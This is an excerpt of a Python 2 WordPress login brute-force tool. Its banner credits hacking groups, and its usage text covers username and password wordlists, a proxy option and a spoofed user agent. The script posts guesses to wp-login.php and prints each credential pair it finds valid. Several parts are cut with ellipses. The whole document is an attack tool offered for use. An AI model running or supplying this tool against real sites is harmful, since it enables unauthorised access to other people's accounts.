...
print " ________ ______ ______ _______ \n";
print "|  |  |  |   __ \   __ \    ___|\n";
print "|  |  |  |    __/   __ <    ___|\n";
print "|________|___|  |______/___| v2.0\n";
print '[!]WordPress BruteForce v2.0 Python~'
print '[!]Keep Learn And Happy Hacking!'
print '[!]Greetz: N45HT - Anon Cyber Team - And MyFriends'
print '[!]Visit us in: https://pixel-code.ga'
print ''
...
if len(sys.argv) <= 1:
    print '[!]Usage: Wpbf.py [-user USER|-f FILE] [-passwd PASS|-F FILE] -u URL [OPT]'
    print '-u URL'
    print '-f File contain list user'
    print '-F File contain list password'
    print '-user Username'
    print '-passwd Password'
    print '-v Verbose mode / show login+pass combination for each attempt'
    print '-c Continue BruteForce after found login/password pair'
    print '-user-agent  | Default: "Mozilla/5.0 (Windows NT 6.1; rv:5.0) Gecko/20100101 Firefox/5.0"'
    print '-x use proxy | ex: 127.0.0.1:1234'
    print ''
    print '[!]Examples: python Wpbf.py -u http://test.com/wp-login.php -user admin -F password.txt'
    sys.exit()
...
#define variables
#
print 'BruteForce Begin, Please wait ...'
url = ''
wordlist = ''
username = ''
password = ''
...
try:
    ...
    if mode == 2:
        ...
        for line in f:            
            ...
            values = {'log' : username,
                      ...
                      'testcookie' : '1' }
            if verbose == 1:
                print "Trying user--pass: " + username + " -- " + password            
            data = urllib.urlencode(values)
            try:
                response = opener.open(url+'/', data)
    ...
    #Finish
    print ''       
    print 'Completed,'+ str(countAcc) +' Username Password Valid Found!'
    print 'TARGET: ' + url
    print 'RESULT:' + result
    sys.exit()
except urllib2.URLError, e:
    print "\n\t[!] Error occured. Check internet settings"
